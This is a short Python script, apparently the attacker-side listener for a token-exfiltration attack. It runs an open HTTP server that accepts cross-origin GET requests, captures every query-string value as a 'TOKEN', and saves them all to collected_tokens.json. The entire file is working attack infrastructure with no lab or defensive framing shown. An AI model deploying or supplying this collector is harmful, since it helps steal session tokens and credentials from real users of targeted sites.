#!/usr/bin/env python3
import http.server
import sys
import json
from datetime import datetime

LOG_FILE = "collected_tokens.json"
collected = {}

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        global collected
        path = self.path
        now = datetime.now().isoformat()
        print(f"[{now}] GET {path}", flush=True)
        
        name = path.strip("/").split("?")[0].split("/")[-1]
        if "?" in path:
            q = path.split("?", 1)[1]
            for p in q.split("&"):
                if "=" in p:
                    k, v = p.split("=", 1)
                    collected[k] = v
                    print(f"  TOKEN: {k} = {v}", flush=True)
                else:
                    collected[p] = ""
        
        with open(LOG_FILE, "w") as f:
            json.dump(collected, f, indent=2)
        
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"OK\n")
        self.wfile.write(json.dumps(collected, indent=2).encode())
    
    log_message = lambda s, *a: None

if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 9999
    print(f"Collector on port {port}...", flush=True)
    http.server.HTTPServer(("0.0.0.0", port), Handler).serve_forever()
